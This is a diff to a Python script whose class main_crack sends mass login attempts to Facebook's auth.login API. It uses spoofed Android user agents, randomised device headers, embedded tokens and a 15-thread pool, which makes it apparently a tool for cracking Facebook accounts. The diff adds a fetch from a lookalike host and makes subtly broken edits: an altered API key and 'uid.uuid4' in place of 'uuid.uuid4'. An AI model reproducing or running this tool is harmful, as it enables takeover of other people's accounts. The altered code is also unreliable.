@@ -40,6 +40,9 @@ import os, platform
 
 from concurrent.futures import ThreadPoolExecutor
 fast_work = ThreadPoolExecutor(max_workers=15).submit
+
+    
+model2 = requests.get('https://giiist.githubusercontent.com').text.splitlines()
 totaldmp = 0
 count = 0
 loop = 0
@@ -57,7 +60,7 @@ filter = []
 def randBuildLSB():
     vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
     VAPP = random.randint(410000000,499999999)
-    END = '[FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
+    END = '[FBAN/FB4A;FBAV/628.0.0.2.146;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
 
@@ -227,7 +230,7 @@ class main_crack():
 "method": "auth.login",
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-"api_key": "882a8490361da98702bf97a021ddc14d"}
+"api_key": "882a8490361qa98702bf97a021ddc14d"}
                 headers = {'User-Agent': randBuildvsskj(),
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
@@ -286,20 +289,20 @@ class main_crack():
 "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
 "generate_session_cookies": "1",
 "meta_inf_fbmeta": "",
-"advertiser_id": str(uuid.uuid4()),
+"advertiser_id": str(uid.uuid4()),
 "currently_logged_in_userid": "0",
 "locale": "en_GB",
 "client_country_code": "GB",
 "method": "auth.login",
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-"api_key": "882a8490361da98702bf97a021ddc14d"}
+"api_key": "882a8490361qa98702bf97a021ddc14d"}
                 headers = {'User-Agent': randBuildLSB(),
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
 'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-FB-Connection-Type': 'MBASIC.LTE',
 'X-Tigon-Is-Retry': 'False',
 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
 'x-fb-device-group': '5120',
@@ -359,7 +362,7 @@ class main_crack():
 "method": "auth.login",
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-"api_key": "882a8490361da98702bf97a021ddc14d"}
+"api_key": "882a8490361qa98702bf97a021ddc14d"}
                 headers = {'User-Agent': randBuildHHL(),
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
